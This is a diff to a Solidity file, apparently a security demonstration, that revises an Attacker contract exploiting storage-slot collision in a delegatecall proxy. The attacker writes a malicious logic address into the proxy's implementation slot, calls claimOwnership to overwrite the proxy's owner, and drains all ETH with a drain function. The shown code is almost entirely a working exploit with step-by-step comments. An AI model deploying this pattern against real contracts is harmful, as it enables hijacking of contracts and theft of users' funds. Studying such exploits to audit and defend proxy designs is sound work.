@@ -82,15 +82,17 @@ contract Attacker {
     function attack() external {
         MaliciousLogic mal = new MaliciousLogic();
 
-        // Step 1: "setPendingAdmin" executes inside proxy's storage context.
-        //   pendingAdmin (slot 0 in logic) maps to implementation (slot 0 in proxy).
+        // Step 1: Call setPendingAdmin through the proxy.
+        //   delegatecall executes inside proxy's context.
+        //   pendingAdmin (slot 0 in logic) → implementation (slot 0 in proxy).
         //   → proxy.implementation is now address(mal)
         VulnerableLogic(address(proxy)).setPendingAdmin(address(mal));
 
-        // Step 2: "confirmAdmin" writes slot 1 inside proxy's context.
-        //   admin (slot 1 in logic) maps to owner (slot 1 in proxy).
+        // Step 2: proxy.implementation is now address(mal), so all calls
+        //   route to MaliciousLogic. Call claimOwnership() through the proxy.
+        //   _ownerSlot (slot 1 in MaliciousLogic) → owner (slot 1 in proxy).
         //   → proxy.owner is now msg.sender (attacker)
-        VulnerableLogic(address(proxy)).confirmAdmin();
+        MaliciousLogic(address(proxy)).claimOwnership();
 
         // Proxy is fully hijacked:
         //   • All future calls route to MaliciousLogic
@@ -100,9 +102,18 @@ contract Attacker {
 }
 
 contract MaliciousLogic {
-    // Complete control — drain ETH, brick the contract, anything.
+    address private _implSlot;  // slot 0 — mirrors proxy.implementation (already hijacked)
+    address private _ownerSlot; // slot 1 — mirrors proxy.owner
+
+    // Writes msg.sender to slot 1 of the proxy, hijacking proxy.owner
+    function claimOwnership() external {
+        _ownerSlot = msg.sender;
+    }
+
+    // Drain all ETH from the proxy
     function drain(address payable to) external {
-        to.transfer(address(this).balance);
+        (bool ok,) = to.call{value: address(this).balance}("");
+        require(ok, "Transfer failed");
     }
 }
 
